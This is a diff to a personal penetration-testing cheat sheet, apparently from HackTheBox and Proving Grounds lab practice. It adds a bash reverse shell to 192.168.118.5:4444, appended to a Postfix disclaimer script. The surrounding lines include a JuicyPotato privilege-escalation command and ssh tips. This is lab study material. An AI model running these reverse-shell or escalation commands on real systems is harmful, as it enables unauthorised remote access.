@@ -353,6 +353,9 @@ jp.exe -t * -p shell.bat -l 4444 -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} #Refe
 ssh login with private key:
 ssh hype@10.10.10.79 -i private_key
 
+Echo bash reverse shell into a file:
+echo 'bash -i >& /dev/tcp/192.168.118.5/4444 0>&1' >> /etc/postfix/disclaimer #postfix proving ground
+
 If doing ssh gives this error(htb sunday):
 Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. 
 Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
